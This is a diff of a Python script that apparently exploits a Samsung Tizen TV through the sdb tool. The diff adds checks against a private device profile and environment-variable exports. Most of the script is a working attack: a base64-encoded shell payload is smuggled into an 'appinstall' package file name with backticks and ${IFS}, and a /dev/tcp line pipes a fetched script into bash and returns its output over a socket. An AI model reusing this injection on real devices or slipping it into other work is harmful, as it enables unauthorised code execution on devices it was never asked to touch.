@@ -1,11 +1,15 @@
 from pathlib import Path
-import sys, base64, ipaddress, json, os, socket, subprocess, time, uuid, urllib.request
+import sys, base64, ipaddress, json, os, re, shlex, socket, subprocess, time, uuid, urllib.request
 r=Path(__file__).resolve().parents[2]; d=r/'.local/native-home'
 mode=sys.argv[1] if len(sys.argv)>1 else 'query'
 if mode not in ['query','apply','restore','inspect']:raise SystemExit('Unknown action')
+profile=json.loads((d/'profile.json').read_text())
+model=profile.get('model_name','');firmware=profile.get('firmware_version','');package=profile.get('package_id','');app=profile.get('app_id','')
+if not all(isinstance(v,str) and v and not v.startswith('YOUR_') for v in [model,firmware,package,app]):raise SystemExit('Complete the private .local/native-home/profile.json first.')
+if not re.fullmatch(r'[A-Za-z0-9._-]+',package) or not re.fullmatch(re.escape(package)+r'\.[A-Za-z0-9._-]+',app):raise SystemExit('Invalid private package/application identity.')
 host=json.loads((r/'.local/device.json').read_text())['host'];ipaddress.ip_address(host)
 with urllib.request.urlopen('http://'+host+':8001/api/v2/',timeout=4) as response: info=json.load(response)
-if info.get('device',{}).get('modelName')!='QA55LS03DAWXXY':raise SystemExit('Model guard failed; nothing staged.')
+if info.get('device',{}).get('modelName')!=model:raise SystemExit('Model guard failed; nothing staged.')
 sdb=str(r/'.local/tizen-sdk/tools/sdb');serial=host+':26101'
 def run(args,timeout=12):
  p=subprocess.run([sdb,*args],capture_output=True,text=True,timeout=timeout)
@@ -25,7 +29,8 @@ with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as route:
 with socket.socket() as listener:
  listener.bind((local,0));listener.listen(1);listener.settimeout(18);port=listener.getsockname()[1]
  command='exec 3<>/dev/tcp/'+local+'/'+str(port)+';cat '+remote+'|bash >&3 2>&3;exec 3>&-'
- script='/bin/mkdir /tmp/s-'+token+' 2>/dev/null&&{ '+command+';}'
+ exports='; '.join('export '+key+'='+shlex.quote(value) for key,value in [('CLEANFRAME_TARGET_APP_ID',app),('CLEANFRAME_TARGET_PACKAGE_ID',package),('CLEANFRAME_EXPECTED_FIRMWARE',firmware)])
+ script='/bin/mkdir /tmp/s-'+token+' 2>/dev/null&&{ '+exports+'; '+command+';}'
  encoded=base64.b64encode(script.encode()).decode()
  name='new2.tpk`printf${IFS}%s${IFS}'+encoded+'|base64${IFS}-d|bash`.tpk'
  argument='0 appinstall tpk '+name
